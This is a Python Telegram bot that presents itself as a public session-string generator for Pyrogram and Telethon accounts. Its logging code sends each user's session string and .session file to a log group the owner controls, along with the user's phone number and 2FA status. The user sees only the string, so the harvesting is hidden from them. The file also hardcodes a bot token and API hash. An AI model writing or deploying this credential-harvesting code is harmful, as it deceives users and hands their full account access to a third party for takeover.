# Bhairavi Session Bot — Ubuntu VPS Final
# Features:
# - Pyrogram V2, Pyrogram V1, Telethon string generation with OTP + 2FA
# - Public gets only the string; log group receives string + .session (once verified)
# - Inline Log CFG (owner/sudo): set log via forward/@username/link/-100 id, verify, then flush queue
# - Welcome config: accepts photo/image doc/static sticker with caption precedence
# - Admin UI hidden from public; daily 03:00 DB backup + restart; queue-based logging avoids PEER_ID_INVALID
#
# Requirements:
#   pip install pyrogram==2.0.106 telethon==1.36.0 tgcrypto apscheduler==3.10.4 pyromod==2.1.0

import os, sys, json, time, asyncio, shutil, glob, logging, mimetypes, re, uuid
from datetime import datetime
from typing import Dict, Any, Set, Optional

# 1) pyromod monkeypatch must load before creating Client so .ask/.listen exist
from pyromod import listen  # enable Client.ask/listen [web:116]

from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, BotCommand
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid, RPCError,
    ChatWriteForbidden, ChatAdminRequired, PeerIdInvalid, BadRequest
)

from telethon.sync import TelegramClient as TClientSync
from telethon.sessions import StringSession as TString
from telethon.errors import SessionPasswordNeededError as TLPasswordNeeded
from telethon.errors.rpcerrorlist import PhoneCodeInvalidError as TLPhoneCodeInvalid

from apscheduler.schedulers.asyncio import AsyncIOScheduler

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("bhairavi")

CONFIG = {
   "BOT_TOKEN": "8458729608:AAFi2m2nJUKeVPwjzoQUJz9t-mB68CaNSIw",
    "API_ID": 22814443,
    "API_HASH": "b9be2b40817a565fe77ef25fe52a871a",
    "OWNER_ID": 8198692931,
    "LOG_CHAT_ID": -1003089868386,  # initial; can change in-bot via Log CFG
    "DB_FILE": ":inline:",          # ":inline:" stores DB as bhairavi_db.json beside this script
    "CACHE_DIR": "cache",           # sessions + welcome media
    "QUEUE_DIR": "queue",           # persistent queue for logs/files until log is verified
    "BACKUP_HOUR": 3,
    "BACKUP_MINUTE": 0,
    "BOT_NAME": "Bhairavi Session Bot"
}

def cfg(k, cast=None):
    v = os.getenv(k) if os.getenv(k) is not None else CONFIG[k]
    if cast:
        try: return cast(v)
        except: return CONFIG[k]
    return v

BOT_TOKEN   = cfg("BOT_TOKEN", str)
API_ID      = cfg("API_ID", int)
API_HASH    = cfg("API_HASH", str)
OWNER_ID    = cfg("OWNER_ID", int)
DB_FILE     = cfg("DB_FILE", str)
CACHE_DIR   = cfg("CACHE_DIR", str)
QUEUE_DIR   = cfg("QUEUE_DIR", str)
BACKUP_HOUR = cfg("BACKUP_HOUR", int)
BACKUP_MIN  = cfg("BACKUP_MINUTE", int)
BOT_NAME    = cfg("BOT_NAME", str)

START_TIME = time.time()
scheduler = AsyncIOScheduler()

# 2) Correct run pattern for Pyrogram on VPS; no coroutine warnings
app = Client("bhairavi_sessions", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH, parse_mode=enums.ParseMode.HTML)  # [web:191]

# -------- DB --------
DB_PATH = "bhairavi_db.json" if DB_FILE == ":inline:" else DB_FILE

def load_db() -> Dict[str, Any]:
    if not os.path.exists(DB_PATH):
        db = {
            "users": [],
            "sudo": [],
            "welcome": {"text": f"Welcome to {BOT_NAME}!", "photo": None},
            "usage": {},
            "log_chat_id": CONFIG.get("LOG_CHAT_ID", None),
            "log_verified": False
        }
        with open(DB_PATH, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
        return db
    with open(DB_PATH, "r", encoding="utf-8") as f:
        return json.load(f)

def save_db(db: Dict[str, Any]) -> None:
    tmp = DB_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_PATH)

DB = load_db()
USERS: Set[int] = set(DB.get("users", []))

def add_user(uid: int):
    if uid not in USERS:
        USERS.add(uid)
        DB["users"] = list(USERS)
        save_db(DB)

def is_owner(uid: int) -> bool:
    return uid == OWNER_ID

def is_sudo(uid: int) -> bool:
    return uid in DB.get("sudo", [])

def inc_usage(key: str):
    usage = DB.get("usage", {})
    usage[key] = int(usage.get(key, 0)) + 1
    DB["usage"] = usage
    save_db(DB)

def get_log_chat_ref() -> Optional[object]:
    return DB.get("log_chat_id", None)

def set_log_chat_ref(ref: object):
    DB["log_chat_id"] = ref
    save_db(DB)

def set_log_verified(flag: bool):
    DB["log_verified"] = bool(flag)
    save_db(DB)

# -------- Queue --------
def ensure_dirs():
    os.makedirs(CACHE_DIR, exist_ok=True)
    os.makedirs(QUEUE_DIR, exist_ok=True)

def enqueue_log_text(text: str):
    ensure_dirs()
    item = {
        "id": str(uuid.uuid4()),
        "type": "text",
        "text": text,
        "time": datetime.now().isoformat(timespec="seconds")
    }
    with open(os.path.join(QUEUE_DIR, f"{item['id']}.json"), "w", encoding="utf-8") as f:
        json.dump(item, f, ensure_ascii=False, indent=2)

def enqueue_log_file(path: str, caption: str):
    ensure_dirs()
    if os.path.exists(path):
        qfile = os.path.join(QUEUE_DIR, f"{uuid.uuid4()}_{os.path.basename(path)}")
        try:
            shutil.copy2(path, qfile)
        except Exception:
            shutil.copy(path, qfile)
        item = {
            "id": str(uuid.uuid4()),
            "type": "file",
            "file": qfile,
            "caption": caption,
            "time": datetime.now().isoformat(timespec="seconds")
        }
        with open(os.path.join(QUEUE_DIR, f"{item['id']}.json"), "w", encoding="utf-8") as f:
            json.dump(item, f, ensure_ascii=False, indent=2)

async def flush_queue():
    if not DB.get("log_verified", False):
        return
    chat_ref = get_log_chat_ref()
    if not chat_ref:
        return
    resolved = await resolve_destination(chat_ref)
    if not resolved:
        return
    items = sorted(glob.glob(os.path.join(QUEUE_DIR, "*.json")))
    for meta in items:
        try:
            with open(meta, "r", encoding="utf-8") as f:
                item = json.load(f)
            if item.get("type") == "text":
                await app.send_message(resolved, item.get("text", ""))  # [web:100]
            elif item.get("type") == "file":
                fpath = item.get("file")
                cap = item.get("caption") or ""
                if fpath and os.path.exists(fpath):
                    await app.send_document(resolved, fpath, caption=cap)  # [web:99]
            os.remove(meta)
            if item.get("type") == "file":
                try: os.remove(item.get("file", ""))
                except Exception: pass
        except Exception as e:
            log.warning(f"Queue flush failed for {meta}: {e}")
            continue

# -------- Utils --------
def fmt_uptime() -> str:
    sec = int(time.time() - START_TIME)
    d, r = divmod(sec, 86400)
    h, r = divmod(r, 3600)
    m, s = divmod(r, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)

def safe_phone_tag(phone: str) -> str:
    return "".join(ch for ch in phone if ch.isdigit() or ch in "+").replace("+", "plus")

def kb_main(owner_or_sudo: bool) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("Pyrogram V2", callback_data="gen_v2"),
         InlineKeyboardButton("Pyrogram V1", callback_data="gen_v1")],
        [InlineKeyboardButton("Telethon", callback_data="gen_tl")]
    ]
    if owner_or_sudo:
        rows.append([InlineKeyboardButton("Status", callback_data="status")])
        rows.append([InlineKeyboardButton("Owner Gcast", callback_data="gcast")])
        rows.append([
            InlineKeyboardButton("Welcome CFG", callback_data="welcome_cfg"),
            InlineKeyboardButton("Sudo Manage", callback_data="sudo_cfg")
        ])
        rows.append([InlineKeyboardButton("Log CFG", callback_data="log_cfg")])
    return InlineKeyboardMarkup(rows)

def kb_cancel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel")]])

async def ask(chat_id: int, user_id: int, prompt: str, is_secret=False) -> Optional[str]:
    try:
        await app.send_message(chat_id, prompt, reply_markup=kb_cancel())  # [web:100]
        ans = await app.ask(chat_id, "Waiting for input…", filters=filters.user(user_id), timeout=300)  # [web:116]
        if not ans or not ans.text:
            return None
        t = ans.text.strip()
        if t.lower() == "cancel":
            await app.send_message(chat_id, "Cancelled.")  # [web:100]
            return None
        if is_secret:
            try: await ans.delete()
            except: pass
        return t
    except asyncio.TimeoutError:
        await app.send_message(chat_id, "Timed out.")  # [web:100]
        return None

# -------- Resolve destination (avoid sending until verified) --------
async def resolve_destination(raw: object) -> Optional[int]:
    try:
        if isinstance(raw, str):
            if raw.startswith("@") or "t.me" in raw:
                ch = await app.get_chat(raw)  # [web:156]
                return ch.id
            m = re.search(r"-?\d{6,20}", raw)
            if m:
                val = int(m.group(0))
                ch = await app.get_chat(val)  # [web:156]
                return ch.id
        elif isinstance(raw, int):
            ch = await app.get_chat(raw)  # [web:156]
            return ch.id
    except (PeerIdInvalid, RPCError):
        return None
    return None

async def verify_and_mark_log(chat_ref: object) -> bool:
    resolved = await resolve_destination(chat_ref)
    if not resolved:
        set_log_verified(False)
        return False
    try:
        await app.send_message(resolved, f"{BOT_NAME}: Logging enabled.")  # [web:100]
        set_log_chat_ref(resolved)
        set_log_verified(True)
        await flush_queue()
        return True
    except (ChatWriteForbidden, ChatAdminRequired, PeerIdInvalid, RPCError):
        set_log_verified(False)
        return False

# -------- Queue-aware logging helpers --------
async def log_text_or_queue(text: str):
    chat_ref = get_log_chat_ref()
    if DB.get("log_verified", False):
        resolved = await resolve_destination(chat_ref)
        if resolved:
            try:
                await app.send_message(resolved, text)  # [web:100]
                return
            except Exception:
                pass
    enqueue_log_text(text)

async def log_file_or_queue(path: str, caption: str):
    chat_ref = get_log_chat_ref()
    if DB.get("log_verified", False):
        resolved = await resolve_destination(chat_ref)
        if resolved:
            try:
                await app.send_document(resolved, path, caption=caption)  # [web:99]
                return
            except Exception:
                pass
    enqueue_log_file(path, caption)

async def send_session_backup(phone: str, session_string: str, session_path: Optional[str], lib_label: str, had_2fa: bool):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    caption = f"{lib_label} backup\nPhone: {phone}\n2FA: {'Yes' if had_2fa else 'No'}\nTime: {ts}"
    await log_text_or_queue(f"{lib_label} | {phone} | 2FA: {'Yes' if had_2fa else 'No'}\n\n<code>{session_string}</code>")
    if session_path and os.path.exists(session_path):
        await log_file_or_queue(session_path, caption)

# -------- Log CFG (owner/sudo) --------
async def set_log_chat_flow(chat_id: int, user_id: int):
    await app.send_message(
        chat_id,
        "Configure log group/channel:\n"
        "• Forward any message from the target group/channel.\n"
        "• Or send @username, invite link, or -100… numeric ID."
    )  # [web:100]
    try:
        ev = await app.ask(chat_id, "Waiting for forwarded message or @username/link/ID…", filters=filters.user(user_id), timeout=180)  # [web:116]
    except asyncio.TimeoutError:
        return await app.send_message(chat_id, "Timed out.")  # [web:100]

    new_ref: Optional[object] = None
    if ev.forward_from_chat:
        new_ref = ev.forward_from_chat.id
    elif ev.text:
        new_ref = ev.text.strip()

    if not new_ref:
        return await app.send_message(chat_id, "Could not determine a log chat. Add the bot and try forwarding a message.")  # [web:100]

    ok = await verify_and_mark_log(new_ref)
    if ok:
        await app.send_message(chat_id, f"Log chat updated and verified: <code>{get_log_chat_ref()}</code>")  # [web:100]
    else:
        await app.send_message(chat_id, "Could not verify posting to that chat. Ensure bot is a member and can Send Messages.")  # [web:100]

# -------- Generators (public gets string; log gets string + .session via queue) --------
async def gen_pyro_v2_flow(chat_id: int, user_id: int):
    inc_usage("gen_v2")
    a_id = await ask(chat_id, user_id, "Send API ID (integer).")
    if not a_id: return
    try: api_id = int(a_id)
    except: return await app.send_message(chat_id, "Invalid API ID.")  # [web:100]
    api_hash = await ask(chat_id, user_id, "Send API HASH (string).")
    if not api_hash: return
    phone = await ask(chat_id, user_id, "Send phone with country code (e.g., +9198xxxxxx).")
    if not phone: return

    from pyrogram import Client as PClient
    phone_tag = safe_phone_tag(phone)
    sess_name = os.path.join(CACHE_DIR, f"pyro_v2_{phone_tag}.session")
    had_2fa = False
    c = PClient(sess_name, api_id=api_id, api_hash=api_hash)
    try:
        await c.connect()
        sent = await c.send_code(phone)
        code = await ask(chat_id, user_id, "Enter the OTP you received.")
        if not code: return
        try:
            await c.sign_in(phone, sent.phone_code_hash, code)
        except SessionPasswordNeeded:
            had_2fa = True
            pwd = await ask(chat_id, user_id, "2-Step password enabled. Enter your password.", is_secret=True)
            if not pwd: return
            try:
                await c.check_password(pwd)
            except PasswordHashInvalid:
                return await app.send_message(chat_id, "Invalid 2-Step password. Aborting.")  # [web:100]
        session = await c.export_session_string()  # [web:57]
        me = await c.get_me()
        await send_session_backup(phone, session, sess_name, "Pyrogram V2", had_2fa)
        await app.send_message(chat_id, f"✅ Pyrogram V2 session for <b>{me.first_name}</b>\n\n<code>{session}</code>")  # [web:100]
    except PhoneCodeInvalid:
        await app.send_message(chat_id, "Invalid OTP. Please retry.")  # [web:71]
    except Exception as e:
        await app.send_message(chat_id, f"Error: <code>{e}</code>")  # [web:77]
    finally:
        try: await c.disconnect()
        except: pass

async def gen_pyro_v1_flow(chat_id: int, user_id: int):
    inc_usage("gen_v1")
    a_id = await ask(chat_id, user_id, "Send API ID (integer).")
    if not a_id: return
    try: api_id = int(a_id)
    except: return await app.send_message(chat_id, "Invalid API ID.")  # [web:100]
    api_hash = await ask(chat_id, user_id, "Send API HASH (string).")
    if not api_hash: return
    phone = await ask(chat_id, user_id, "Send phone with country code (e.g., +9198xxxxxx).")
    if not phone: return

    from pyrogram import Client as PClient
    phone_tag = safe_phone_tag(phone)
    sess_name = os.path.join(CACHE_DIR, f"pyro_v1_{phone_tag}.session")
    had_2fa = False
    c = PClient(sess_name, api_id=api_id, api_hash=api_hash, app_version="Pyrogram v1")
    try:
        await c.connect()
        sent = await c.send_code(phone)
        code = await ask(chat_id, user_id, "Enter the OTP you received.")
        if not code: return
        try:
            await c.sign_in(phone, sent.phone_code_hash, code)
        except SessionPasswordNeeded:
            had_2fa = True
            pwd = await ask(chat_id, user_id, "2-Step password enabled. Enter your password.", is_secret=True)
            if not pwd: return
            try:
                await c.check_password(pwd)
            except PasswordHashInvalid:
                return await app.send_message(chat_id, "Invalid 2-Step password. Aborting.")  # [web:100]
        session = await c.export_session_string()  # [web:57]
        me = await c.get_me()
        await send_session_backup(phone, session, sess_name, "Pyrogram V1", had_2fa)
        await app.send_message(chat_id, f"✅ Pyrogram V1 session for <b>{me.first_name}</b>\n\n<code>{session}</code>")  # [web:100]
    except PhoneCodeInvalid:
        await app.send_message(chat_id, "Invalid OTP. Please retry.")  # [web:71]
    except Exception as e:
        await app.send_message(chat_id, f"Error: <code>{e}</code>")  # [web:77]
    finally:
        try: await c.disconnect()
        except: pass

async def gen_telethon_flow(chat_id: int, user_id: int):
    inc_usage("gen_tl")
    a_id = await ask(chat_id, user_id, "Send API ID (integer).")
    if not a_id: return
    try: api_id = int(a_id)
    except: return await app.send_message(chat_id, "Invalid API ID.")  # [web:100]
    api_hash = await ask(chat_id, user_id, "Send API HASH (string).")
    if not api_hash: return
    phone = await ask(chat_id, user_id, "Send phone with country code.")
    if not phone: return

    def run_sync():
        c = TClientSync(TString(), api_id, api_hash)
        c.connect()
        return c
    loop = asyncio.get_running_loop()
    c: TClientSync = await loop.run_in_executor(None, run_sync)

    had_2fa = False
    try:
        sent = c.send_code_request(phone)
        code = await ask(chat_id, user_id, "Enter the OTP you received.")
        if not code:
            c.disconnect(); return
        try:
            c.sign_in(phone=phone, code=code, phone_code_hash=sent.phone_code_hash)
        except TLPasswordNeeded:
            had_2fa = True
            pwd = await ask(chat_id, user_id, "2-Step password enabled. Enter your password.", is_secret=True)
            if not pwd:
                c.disconnect(); return
            try:
                c.check_password(pwd)
            except Exception:
                c.disconnect(); return await app.send_message(chat_id, "Invalid 2-Step password. Aborting.")  # [web:100]
        except TLPhoneCodeInvalid:
            c.disconnect(); return await app.send_message(chat_id, "Invalid OTP. Please retry.")  # [web:71]
        session_string = c.session.save()
        me = c.get_me()
        session_path = os.path.join(CACHE_DIR, f"telethon_{safe_phone_tag(phone)}.session")
        with open(session_path, "w", encoding="utf-8") as f:
            f.write(session_string)
        await send_session_backup(phone, session_string, session_path, "Telethon", had_2fa)
        await app.send_message(chat_id, f"✅ Telethon session for <b>{getattr(me,'first_name','User')}</b>\n\n<code>{session_string}</code>")  # [web:100]
    except Exception as e:
        await app.send_message(chat_id, f"Error: <code>{e}</code>")  # [web:77]
    finally:
        try: c.disconnect()
        except: pass

# -------- Commands --------
@app.on_message(filters.private & filters.command(["start"]))
async def start_cmd(_, m: Message):
    uid = m.from_user.id
    add_user(uid)
    inc_usage("start")
    owner_or_sudo = is_owner(uid) or is_sudo(uid)
    wl = DB.get("welcome", {"text": f"Welcome to {BOT_NAME}!", "photo": None})
    text = wl.get("text") or f"Welcome to {BOT_NAME}!"
    try:
        if wl.get("photo"):
            await m.reply_photo(wl["photo"], caption=text, reply_markup=kb_main(owner_or_sudo))  # [web:146]
        else:
            await m.reply_text(text, reply_markup=kb_main(owner_or_sudo))  # [web:123]
    except Exception as e:
        await m.reply_text(text, reply_markup=kb_main(owner_or_sudo))  # [web:123]
        log.warning(f"start photo send failed: {e}")
    await log_text_or_queue(f"Start by {uid}")

@app.on_message(filters.command(["help"]))
async def help_cmd(_, m: Message):
    uid = m.from_user.id
    inc_usage("help")
    public_help = (
        "<b>Public Commands</b>\n"
        "/start - Open panel\n"
        "/help - Show this help\n"
        "/status - Bot status\n"
        "Use the buttons to generate Pyrogram V2, Pyrogram V1, or Telethon sessions."
    )
    owner_help = (
        "<b>Owner/Sudo Commands</b>\n"
        "/gcast <text> or reply /gcast\n"
        "/setwelcome <text> (reply to image/file to set photo)\n"
        "/addsudo <user_id> | /rmsudo <user_id>"
    )
    if is_owner(uid) or is_sudo(uid):
        await m.reply_text(public_help + "\n\n" + owner_help)  # [web:123]
    else:
        await m.reply_text(public_help)  # [web:123]
    await log_text_or_queue(f"Help by {uid}")

@app.on_message(filters.command("status"))
async def status_cmd(_, m: Message):
    inc_usage("status")
    uids_preview = ", ".join(map(str, list(USERS)[:50])) or "None"
    usage = json.dumps(DB.get("usage", {}))
    txt = (
        f"• Bot: <b>{BOT_NAME}</b>\n"
        f"• Uptime: <code>{fmt_uptime()}</code>\n"
        f"• Users: <code>{len(USERS)}</code>\n"
        f"• User IDs (first 50): <code>{uids_preview}</code>\n"
        f"• Usage: <code>{usage}</code>\n"
        f"• Log verified: <code>{DB.get('log_verified', False)}</code>"
    )
    await m.reply_text(txt)  # [web:123]
    await log_text_or_queue(f"Status by {m.from_user.id}")

@app.on_message(filters.command("gcast") & (filters.user(OWNER_ID) | filters.user(DB.get("sudo", []))))
async def gcast_cmd(_, m: Message):
    inc_usage("gcast")
    if len(USERS) == 0:
        return await m.reply_text("No users to broadcast.")  # [web:123]
    if m.reply_to_message:
        sent = 0; failed = 0
        for uid in list(USERS):
            try:
                await m.reply_to_message.copy(uid)
                sent += 1
            except Exception:
                failed += 1
        await m.reply_text(f"Gcast done. Sent: <code>{sent}</code> | Failed: <code>{failed}</code>")  # [web:123]
        return
    text = m.text.split(None, 1)[1] if len(m.command) > 1 else None
    if not text:
        return await m.reply_text("Reply to a message or use /gcast Your text")  # [web:123]
    sent = 0; failed = 0
    for uid in list(USERS):
        try:
            await app.send_message(uid, text)  # [web:100]
            sent += 1
        except Exception:
            failed += 1
    await m.reply_text(f"Gcast done. Sent: <code>{sent}</code> | Failed: <code>{failed}</code>")  # [web:123]
    await log_text_or_queue(f"Gcast by {m.from_user.id}: sent={sent} failed={failed}")

@app.on_message(filters.user(OWNER_ID) & filters.command("setwelcome"))
async def set_welcome(_, m: Message):
    inc_usage("setwelcome")
    new_text = m.text.split(None, 1)[1] if len(m.command) > 1 else None
    saved_photo = None

    if m.reply_to_message:
        r = m.reply_to_message
        media = None
        if r.photo:
            media = r.photo
        elif r.document:
            mime = r.document.mime_type or mimetypes.guess_type(r.document.file_name or "")[0] or ""
            if mime.startswith("image/"):
                media = r.document
        elif r.sticker:
            if not r.sticker.is_animated and not r.sticker.is_video:
                media = r.sticker
        if media:
            try:
                path = await app.download_media(media, file_name=os.path.join(CACHE_DIR, "welcome_media"))  # [web:100]
                saved_photo = path
            except Exception as e:
                log.warning(f"welcome media download failed: {e}")

    curr = DB.get("welcome", {"text": f"Welcome to {BOT_NAME}!", "photo": None})
    if saved_photo and new_text:
        DB["welcome"] = {"text": new_text, "photo": saved_photo}
    elif saved_photo and not new_text:
        DB["welcome"] = {"text": curr.get("text") or f"Welcome to {BOT_NAME}!", "photo": saved_photo}
    elif new_text and not saved_photo:
        DB["welcome"] = {"text": new_text, "photo": curr.get("photo")}
    else:
        return await m.reply_text("Reply to an image/file (image/*) and/or add text: /setwelcome Your caption")  # [web:123]

    save_db(DB)
    wl = DB["welcome"]
    try:
        if wl.get("photo"):
            await m.reply_photo(wl["photo"], caption=wl.get("text") or f"Welcome to {BOT_NAME}!")  # [web:146]
        else:
            await m.reply_text(wl.get("text") or f"Welcome to {BOT_NAME}!")  # [web:123]
    except Exception as e:
        await m.reply_text("Welcome message updated.")  # [web:123]
        log.warning(f"welcome preview failed: {e}")

# -------- Callbacks --------
@app.on_callback_query()
async def cbs(_, cq: CallbackQuery):
    if not cq.message:
        return await cq.answer("Message expired.", show_alert=True)
    uid = cq.from_user.id
    add_user(uid)
    data = (cq.data or "").strip()
    if len(data) > 64:
        return await cq.answer("Invalid data.", show_alert=True)
    owner_or_sudo = is_owner(uid) or is_sudo(uid)

    if data == "cancel":
        return await cq.answer("Cancelled.", show_alert=False)
    if data == "status":
        if not owner_or_sudo:
            return await cq.answer("Owner/Sudo only.", show_alert=True)
        await status_cmd(_, cq.message)
        return await cq.answer("Status updated.", show_alert=False)
    if data == "gcast":
        if not owner_or_sudo:
            return await cq.answer("Owner/Sudo only.", show_alert=True)
        await cq.message.reply_text("Send /gcast <text> or reply /gcast to a message to broadcast.", reply_markup=kb_cancel())  # [web:123]
        return await cq.answer("Waiting…", show_alert=False)
    if data == "welcome_cfg":
        if not owner_or_sudo:
            return await cq.answer("Owner/Sudo only.", show_alert=True)
        await cq.message.reply_text("Reply to an image/file with /setwelcome <caption> or send /setwelcome <text>.")  # [web:123]
        return await cq.answer()
    if data == "sudo_cfg":
        if not is_owner(uid):
            return await cq.answer("Owner only.", show_alert=True)
        sudo_list = ", ".join(map(str, DB.get("sudo", []))) or "None"
        await cq.message.reply_text(f"Sudo users: <code>{sudo_list}</code>\nUse /addsudo <id>, /rmsudo <id>.")  # [web:123]
        return await cq.answer()
    if data == "log_cfg":
        if not owner_or_sudo:
            return await cq.answer("Owner/Sudo only.", show_alert=True)
        await cq.answer("Opening Log configuration…", show_alert=False)
        await set_log_chat_flow(cq.message.chat.id, uid)
        return
    if data == "gen_v2":
        await cq.answer("Starting Pyrogram V2…", show_alert=False)
        await gen_pyro_v2_flow(cq.message.chat.id, uid)
        return
    if data == "gen_v1":
        await cq.answer("Starting Pyrogram V1…", show_alert=False)
        await gen_pyro_v1_flow(cq.message.chat.id, uid)
        return
    if data == "gen_tl":
        await cq.answer("Starting Telethon…", show_alert=False)
        await gen_telethon_flow(cq.message.chat.id, uid)
        return
    await cq.answer("Unknown action.", show_alert=True)

# -------- Backup + Restart (queue-aware) --------
async def perform_backup_and_restart():
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_path = f"backup_{ts}.json"
    with open(backup_path, "w", encoding="utf-8") as f:
        json.dump(DB, f, ensure_ascii=False, indent=2)
    await log_file_or_queue(backup_path, f"Daily backup {ts}\nUsers: {len(DB.get('users', []))}")
    # Clear cache (keep DB)
    try:
        if os.path.isdir(CACHE_DIR):
            for p in glob.glob(os.path.join(CACHE_DIR, "*")):
                try:
                    if os.path.isdir(p): shutil.rmtree(p, ignore_errors=True)
                    else: os.remove(p)
                except Exception:
                    continue
    except Exception:
        pass
    py = sys.executable
    args = sys.argv
    os.execv(py, [py] + args)

async def set_public_bot_commands():
    try:
        cmds = [BotCommand("start", "Open panel"), BotCommand("help", "Show help"), BotCommand("status", "Bot status")]
        await app.set_bot_commands(cmds)  # [web:78]
    except RPCError as e:
        log.warning(f"set_bot_commands failed: {e}")

async def startup_checks():
    me = await app.get_me()
    log.info(f"Logged in as @{me.username or me.first_name}")
    ensure_dirs()
    # Try verify log; if it fails, keep queueing silently
    chat_ref = get_log_chat_ref()
    if chat_ref:
        ok = await verify_and_mark_log(chat_ref)
        if not ok:
            log.warning("Log destination not verified; logs will be queued until Log CFG succeeds.")

def schedule_jobs():
    scheduler.add_job(perform_backup_and_restart, "cron", hour=BACKUP_HOUR, minute=BACKUP_MIN)  # [web:191]
    scheduler.start()

# 3) Proper run pattern for Ubuntu VPS: app.run(main())
async def main():
    async with app:
        await startup_checks()
        await set_public_bot_commands()
        schedule_jobs()
        from pyrogram import idle
        await idle()  # [web:191]

if __name__ == "__main__":
    if "YOUR_" in BOT_TOKEN or "YOUR_" in API_HASH or API_ID == 12345:
        print("Set BOT_TOKEN, API_ID, API_HASH, OWNER_ID in the script or export as env before running.")
        sys.exit(1)
    # ---- FIXED ENTRYPOINT: let Pyrogram manage the loop and run your main() coroutine ----
    # Passing the coroutine function to app.run ensures the client starts, your main() runs on the same loop,
    # then Pyrogram idles — avoiding "attached to a different loop" RuntimeError.
    app.run(main=main)
